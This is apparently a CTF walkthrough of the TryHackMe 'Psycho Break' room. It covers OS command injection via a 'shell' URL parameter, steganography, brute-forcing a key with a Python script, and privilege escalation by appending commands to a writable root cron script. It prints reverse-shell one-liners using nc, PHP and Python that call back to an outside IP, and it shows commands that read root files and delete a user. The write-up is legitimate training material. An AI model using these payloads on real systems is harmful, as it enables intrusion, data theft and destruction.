# <div align="center">[Psycho Break](https://tryhackme.com/room/psychobreak)</div>
<div align="center">Help Sebastian and his team of investigators to withstand the dangers that come ahead.
</div>
<br>
<div align="center">
<img width="200" height="200" alt="image" src="https://github.com/user-attachments/assets/339faf81-836e-48af-b8d8-9c60944d2405" />
</div>

### [Task 1] Recon

1. ##### Deploy the machine.

Obviously, the first and most important step to complete any room is to deploy the machine first of all.

2. ##### How many ports are open?

To get the answer for this question the best solution is to run an `nmap` scan against the IP address of the machine.
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/5b084552-d679-4f08-9078-2e4acf96d27f" />
</p>

And we can see, all the ports that are open on the machine!

3. ##### What is the operating system that runs on the target machine?

The answer to this question can be guessed from the details that we obtained from the nmap scan. We can see that an OS type of Unix, Linux was detected and the other hint that we can find is from the SSH and Apache version.

### [Task 2]  Web

1. ##### Key to the locker room.

From the nmap scan we can see that port 80 is open and Apache server is running on it. So, we can visit the IP address and check what is being hosted over there. 
<p align="center">
  <img width="940" height="530" alt="image" src="https://github.com/user-attachments/assets/5cd92a0f-9c6d-41aa-8b4a-03c615341318" />
</p>

This just gives us a very brief overview of the page but no useful information. So, can go ahead and check the source-code of the page to see if some information is available over there.
<p align="center">
<img width="940" height="267" alt="image" src="https://github.com/user-attachments/assets/bb1ed45d-6a38-4abf-b8a4-6b3e0c5c8aca" />
</p>

And here we find a path for a hidden directory. We can visit the path and look for any further hints.
<p align="center">
  <img width="940" height="507" alt="image" src="https://github.com/user-attachments/assets/73802f42-1092-4cbd-9a8d-4cbbca69678b" />
</p>

On the hidden page, we can see a clickable link. On clicking the link, we get a pop-up which gives us the key to the locker room. Now that we have the key, we can submit it as the answer as well.

2. ##### Key to access the map

As soon as we get the locker room key and press "OK", we get redirected to another page where we can find a link for the locker room.

<p align="center">
  <img width="940" height="725" alt="image" src="https://github.com/user-attachments/assets/77081712-1830-4fc2-9415-b1e27ed90d9e" />
</p>

And when we click that link, it asks for the locker room key in a pop-up window.Once submitted the obtained key, we get redirected to the locker room.
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/4dafca05-d9d8-42f1-87d0-43f673d49069" />
</p>

On the locker room page, If we view-source-page we found:
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/738245ee-c09f-4dc9-9426-59c372fca0f3" />
</p>

But it is encrypted so we use the below website:
<p align="center">
  <img width="939" height="526" alt="image" src="https://github.com/user-attachments/assets/fda4db3e-e366-46f7-8620-bcaced7b5acb" />
</p>

3. ##### The Keeper Key

As soon as we click on the link to access the map, we are asked to enter the key to access the map.
<p align="center">
  <img width="940" height="369" alt="image" src="https://github.com/user-attachments/assets/553f5575-60e0-40df-aec7-4e3b5f809029" />
</p>

Once entered the key, we get an index of all the various rooms present.
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/7d9c5fd5-48ac-4317-a326-573cd5157c56" />
</p>

Out of these four rooms, we have already completed two. So, our next step would be to access the third room which is "Safe Heaven".

This room appears to be pretty simple and contains a few images as well but nothing that can be useful to us.
<p align="center">
  <img width="1252" height="592" alt="image" src="https://github.com/user-attachments/assets/17601115-55b2-40d2-a82e-b2fce8932e04" />
</p>

We can go ahead and check for any information in it's source-code.
<p align="center">
  <img width="1241" height="677" alt="image" src="https://github.com/user-attachments/assets/a8f2d739-2a58-48c9-93cd-81defe8c0951" />
</p>

Then we used ffuf to enumerate further:
```
$ffuf -u http://<machine-ip>/SafeHeaven/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://<machine-ip>/SafeHeaven/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
# Copyright 2007 James Fisher [Status: 200, Size: 1299, Words: 88, Lines: 52]
# directory-list-2.3-medium.txt [Status: 200, Size: 1299, Words: 88, Lines: 52]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 1299, Words: 88, Lines: 52]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1299, Words: 88, Lines: 52]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 1299, Words: 88, Lines: 52]
# This work is licensed under the Creative Commons  [Status: 200, Size: 1299, Words: 88, Lines: 52]
                        [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
# on atleast 2 different hosts [Status: 200, Size: 1299, Words: 88, Lines: 52]
imgs                    [Status: 301, Size: 324, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://<machine-ip>/SafeHeaven/imgs/FUZZ
                        [Status: 200, Size: 1299, Words: 88, Lines: 52]
keeper                  [Status: 301, Size: 326, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://<machine-ip>/SafeHeaven/keeper/FUZZ
```

 Here, we found a hidden directory `keeper`. 

On visiting that page, we get a link to `Escape Keeper`. When we click on that link, we are show an image and asked to find it's real location name.

Save the image and perform Google search using Lens.
<p align="center">
  <img width="1048" height="507" alt="image" src="https://github.com/user-attachments/assets/33d80de4-f048-46ec-b38a-f10c01fa65b6" />
</p>

And here we find the location of the image that can be entered in the challenge to obtain the Keeper Key.  As soon as we submit the location name, we are redirected to another page where we are provided the keeper key. We can submit this key as the answer and move ahead to the fourth and last room on the map.

4. ##### What is the filename of the text file (without the file extension)

On the abandoned room page, we can find a link saying "Go Further" which leads us to another page where a timer is running and asks us to "Run" from the "Laura the Spiderlady".

There is no hint on the page as to how to run from laura, so we can head over to the source-code to see if some hint is provided over there.
<p align="center">
  <img width="940" height="556" alt="image" src="https://github.com/user-attachments/assets/589de44c-756f-41a8-8043-7791f848bf44" />
</p>

Here, we are provided with a hint that there is "something called as `shell`" on the page that might be helpful. This gives an immediate hint towards OS command injection via setting GET request parameters in the URL. 

So, we can add the parameter `shell` to the URL and pass any OS commands to it. From the inital recon we know that it is a Linux machine. So, can try its compatible commands.

```
http://<machine-ip>/abandonedRoom/*********************************/herecomeslara.php?shell=ls
```

Sending this command would show us the files present in the current directory.
<p align="center">
  <img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/176e8bc7-be56-40e1-8b5a-38d96eb8726f" />
</p>

But here comes the tricky part, other than `ls` none of the commands worked. We can try various commands like:

```
cat /etc/passwd
ls -la
ls ../
ls ../../
pwd
id

Reverse Shell codes:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.240.79 4444 >/tmp/f
php -r '$sock=fsockopen("192.168.240.79",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
export RHOST="192.168.240.79";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

But none of these work. After almost a day, I got a hint from someone to try to use `ls ..`, to which I was surprised as I had already tried `ls ../` which did not work.
<p align="center">
  <img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/090f93fa-9b80-46df-a8b5-c4cc62bad995" />
</p>

So, here we find another hidden directory. We can copy the path and add it to the URL and access it:

```
http://<machine-ip>/abandonedRoom/*********************************/
```

On visiting the directory, we find a zip and a text file over there.
<p align="center">
  <img width="940" height="528" alt="image" src="https://github.com/user-attachments/assets/b70f237b-79cf-4512-a58a-1a3bf54f9409" />
</p>

We can download both these file and check their content.

Also, the name of this text file can be submitted as the answer.

### [Task 3] Help Mee

1. ##### Who is locked up in the cell?

The text file named `you_made_it.txt` does not contain anything useful so we can unzip the `helpme.zip` file and check it's content.

```
$unzip helpme.zip
$cat helpme.txt 

From XXXXXX,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
this cell.
```

We obtain two files from the zip out of which one is a text file and the other one is a jpg image. There is note in the text file where someone is asking for help and giving a hint that the key is stored in the image `Table.jpg`. Also, the name of this person, who has written this note can be submitted as the answer.

2. ##### There is something weird with the .wav file. What does it say?

On trying to view the image, we can come to know that it is in reality not an image file but something else. So, we can check its file type by using the command `file`

```
$file Table.jpg 
Table.jpg: Zip archive data, at least v2.0 to extract
```

After unzipping the file, we obtain two another files:

```
$mv Table.jpg Table.zip
$unzip Table.zip 
Archive:  Table.zip
  inflating: Joseph_Oda.jpg          
  inflating: key.wav  
```

The question asks about the `wav` file, so we can first check its content by playing it. We can hear some beep kind of sound which suggests that it is a morse code. So, we can google a bit and find a morse code audio decoder. I found one over [here](https://morsecode.world/international/decoder/audio-decoder-adaptive.html). Once, we submit the file and it gets processed we get a string which appears to be the key for the data hidden in the `Joseph_Oda.jpg` file. Also, the string obtained from the `wav` file can be submitted as the answer. 

3. ##### What is the FTP Username

4. ##### What is the FTP Password

So, the next thing that we must do is use `steghide` over the `jpg` file and pass the key obtained from `wav` file as the passphrase to get the hidden content.
<p align="center">
  <img width="939" height="301" alt="image" src="https://github.com/user-attachments/assets/ec386160-057e-4fbd-ab9d-8097f8414e87" />
</p>

From the extracted hidden data, we get the login credentials of user `joseph` for FTP. We can use these credentials and access the data store in FTP.

### [Task 4] Crack it open

1. ##### The key used by the program
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/ee34f844-a001-4cf1-8a67-0f06cd2ff156" />
</p>

On the FTP, we find two files `program` which is an executable and a dictionary `random.dic`.

It appears that we must pass one by one each key from the dictionary to the program in order to obtain the correct key. To do so, we can write a small [python script](./script.py) to automate this task.

```
import os
import subprocess
import sys

f = open("random.dic", "r")

keys = f.readlines()

for key in keys:
	key = str(key.replace("\n", ""))
	print (key)
	subprocess.run(["./program", key])
```

Once we run the script after placing it in the same directory as `random.dic` and `program`, we can get the correct key from its output.

This key can be submitted as the answer.

2. ##### What do the crazy long numbers mean when there decrypted.
<p align="center">
  <img width="939" height="356" alt="image" src="https://github.com/user-attachments/assets/317f8c25-8083-4597-afac-2da103826ed4" />
</p>

Decrypted the crazy long numbers:
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/6e1f53e1-5bb4-4718-95ee-5f9efc179564" />
</p>

### [Task 5] Go Capture The Flag

From the decryted string in last task, we can assume that the key from `program` is the user name and the decoded string is the password. So, we can go ahead and connect to the machine via SSH.

Hint: The password is in all CAPS.

1. ##### user.txt

As soon as we log in we can find the `user.txt` file which we can read and get the user flag.
<p align="center">
  <img width="939" height="528" alt="image" src="https://github.com/user-attachments/assets/dd8b1f46-cc86-4bbf-82f5-587ddc3979a7" />
</p>

This can be submitted as the user flag.

2. ##### root.txt

The first thing that we can check for PrivEsc is `sudo -l`:

```
kidman@evilwithin:~$ sudo -l
[sudo] password for kidman: 
Sorry, user kidman may not run sudo on evilwithin.
```

But apparently we are not allowed to run any commands as sudo. 

The next thing that we can check are the cron jobs.

```
kidman@evilwithin:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```

And here we can see a python script is running which is stored at `/var/.the_eye_of_ruvik.py`. We can check if we can edit this file and if so we can modify it and use for our benefit.

```
kidman@evilwithin:~$ ls -la /var/.the_eye_of_ruvik.py 
-rwxr-xrw- 1 root root 300 Aug 14 22:43 /var/.the_eye_of_ruvik.py
```

It appears that we can edit this file. So, we can add a command in it to write the content of `/root/root.txt` to a file in `/tmp` directory. But before that we need to create an empty file in `temp` and change its permissions so that when the script get executed it can write to the file.

```
kidman@evilwithin:~$ touch /tmp/flag
kidman@evilwithin:~$ chmod 777 /tmp/flag 
kidman@evilwithin:~$ ls -la /tmp/flag 
-rwxrwxrwx 1 kidman kidman 0 Oct 12 04:48 /tmp/flag
```

Now, we can modify the python script just by adding a simple line at the end of it:

```
kidman@evilwithin:~$ echo 'subprocess.call("cat /root/root.txt > /tmp/flag", shell=True)' >> /var/.the_eye_of_ruvik.py 
kidman@evilwithin:~$ cat /var/.the_eye_of_ruvik.py 
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

subprocess.call("cat /root/root.txt > /tmp/flag")
```
<p align="center">
  <img width="939" height="438" alt="image" src="https://github.com/user-attachments/assets/dfac8605-1aba-4e89-8c5e-8259d07dfd0a" />
</p>

Used netcat for reverse shell 
<p align="center">
  <img width="939" height="340" alt="image" src="https://github.com/user-attachments/assets/9d8a7e45-33ed-441c-a7d2-e7ea749de30a" />
</p>

Now, we need to wait some time and check the file `/tmp/flag` where the script will automatically write down the flag from `/root/root.txt`.

3. ##### [Bonus] Defeat Ruvik

For this task we need to delete Ruvik's account, but that can be done only by `root`. So, we can add another command in the same python script to remove the user `ruvik` along with all his files:

```
kidman@evilwithin:/home$ echo 'subprocess.call("deluser --remove-all-files ruvik", shell=True)' >> /var/.the_eye_of_ruvik.py 
kidman@evilwithin:/home$ cat /var/.the_eye_of_ruvik.py 
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

subprocess.call("cat /root/root.txt > /tmp/flag", shell=True)
subprocess.call("deluser --remove-all-files ruvik", shell=True)
```
Now, just wait for some time and check the /home directory from where ruvik's directory would get deleted indicating that the user has been deleted.

Completed Room
